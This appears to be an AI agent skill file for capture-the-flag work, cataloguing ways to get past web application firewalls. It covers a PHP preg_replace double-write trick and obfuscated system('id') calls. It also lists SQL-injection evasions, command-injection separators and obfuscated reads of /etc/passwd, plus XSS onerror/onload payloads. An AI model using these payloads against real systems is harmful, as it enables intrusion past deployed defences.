---
name: waf-bypass
description: WAF-bypass technique library — bypass methods for various WAFs
---

# WAF-Bypass Technique Library

## PHP WAF bypass

### preg_replace double-write bypass (key technique)

`preg_replace()` **replaces repeatedly** until nothing matches, but if a keyword, once replaced, **spells out a new keyword**, only the inner match is replaced and the outer one remains.

**Core principle**: `preg_replace('/NSSCTF/', '', 'NSSNSSCTFCTF')` → removes the middle `NSSCTF` → leaves `NSS` + `CTF` = `NSSCTF`

**General template**:
```
Suppose the filtered keyword is X (e.g. NSSCTF)
Construct the input: split X in half, embed a full X in the middle
i.e.: first-half-of-X + X + second-half-of-X

Examples:
Filter NSSCTF → input NSS + NSSCTF + CTF = NSSNSSCTFCTF
Filter flag   → input fl + flag + ag = flflagag
Filter cat    → input ca + cat + t = cacatt
Filter system → input sys + system + tem = syssystemtem
```

**Why simple case-variation does not work against preg_replace**:
- `preg_replace('/NSSCTF/', '', 'NssCTF')` → `Nss` does not match `NSS` (no `i` modifier) → output stays `NssCTF`
- `NssCTF !== "NSSCTF"` (strict comparison fails) → does not pass
- Only the double-write bypass makes the string after replacement **exactly equal the original keyword**

**⚠️ When to recognize this**:
- The source contains `preg_replace('/keyword/', '', $input)` and `$input` must, after replacement, **equal the keyword itself** → use the double-write bypass immediately
- Do not try case variation (the result does not equal the original keyword) or encoding bypass (the encoded string does not equal the original keyword)

### Function-name obfuscation
- Base64-decode to recover: `$f=base64_decode('c3lzdGVt');$f('id');`
- String concatenation: `$f='sys'.'tem';$f('id');`
- Variable functions: `$a='sys';$b='tem';$a$b('id');`

### Keyword bypass
- Split the path: `'/va'.'r/ww'.'w/ht'.'ml'`
- Comment bypass: `sys/**/tem('id');`
- Reverse the string: `$f=strrev('metsys');$f('id');`

## SQL injection bypass

### Keyword bypass
- Mixed case: `SeLeCt` instead of `SELECT`
- Inline comments: `S/*!ELECT*/`
- Double encoding: `%2565` → `%65` → `e`
- Equivalent functions: `GROUP_CONCAT` instead of `concat_ws`

### Comment-marker variants
- `-- -` instead of `--`
- `--+` instead of `-- `
- `#` instead of `--`

## Command-injection bypass

### Separator variants
- Newline: `id\nwhoami`
- Pipe: `id|whoami`
- Logical operators: `id&&whoami`
- Subshell: `$(id)` or `` `id` ``

### Command obfuscation
- Variable concatenation: `a=i;b=d;$a$b`
- Wildcards: `/bin/ca? /etc/pas?d`
- Empty variables: `c'a't /etc/passwd`
- Escaping: `c\at /etc/passwd`

## XSS bypass

### Tag variants
- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
- `<input onfocus=alert(1) autofocus>`

### Event handlers
- `onerror`, `onload`, `onclick`, `onfocus`, `onmouseover`

### Encoding bypass
- HTML-entity encoding
- Unicode encoding
- Base64 encoding (paired with eval)
